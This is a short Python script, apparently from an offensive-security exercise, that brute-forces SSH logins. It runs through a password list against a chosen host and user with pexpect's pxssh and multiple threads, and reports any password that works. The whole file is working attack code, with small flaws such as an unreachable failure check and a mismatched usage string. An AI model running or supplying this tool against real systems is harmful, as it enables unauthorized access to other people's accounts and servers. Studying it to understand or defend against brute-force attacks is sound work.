##!/usr/bin/env python
#!coding:utf-8

from pexpect import pxssh
import traceback
import optparse
import time
import threading
import sys
import os
import getpass

maxConnections = 5
connection_lock = threading.BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0

	
def connect(host, user, password, release):
    global Found,Fails
    try:
        s = pxssh.pxssh()
        # use pxssh class login method to ssh login
        s.login(host,user,password)
        print('[+] Password Found: '+ password)
        Found = True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            Fails +=1
            time.sleep(5)
            connect(host,user,password, False)
        elif 'synchronize with original prompt' in str(e) :
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()


def main():
    usage = '%prog' +'-H <target host> -u <user> -f <password list>'
    parser = optparse.OptionParser(usage)
    parser.add_option('-H', dest = 'tgtHost', type = 'string', help = 'target host')
    parser.add_option('-p', dest = 'passwdFile', type = 'string', help = 'user password file')
    parser.add_option('-u', dest = 'user', type = 'string', help = 'username')
    (options, args) = parser.parse_args()
    host = options.tgtHost
    passwdFile = options.passwdFile
    user = options.user
    if host is None or passwdFile is None or user is None:
        print(parser.usage)
        exit(0)
    fn = open(passwdFile,'r')
    for line in fn.readlines():
        if Found:
            print("[*] Exiting: password find!")
            exit(0)
            if Fails > 5:
                print("[!] Timeout!")
                exit(0)
        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        print("[-] Testing: " + str(password))
        threading.Thread(target=connect,args=(host, user, password, True)).start()
    # improvement: username could also retrieve from file, ip address allow more format

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: " + sys.argv[0] + "-H <target host> -u <user> -p <password list>")
        sys.exit(-1)
    main()
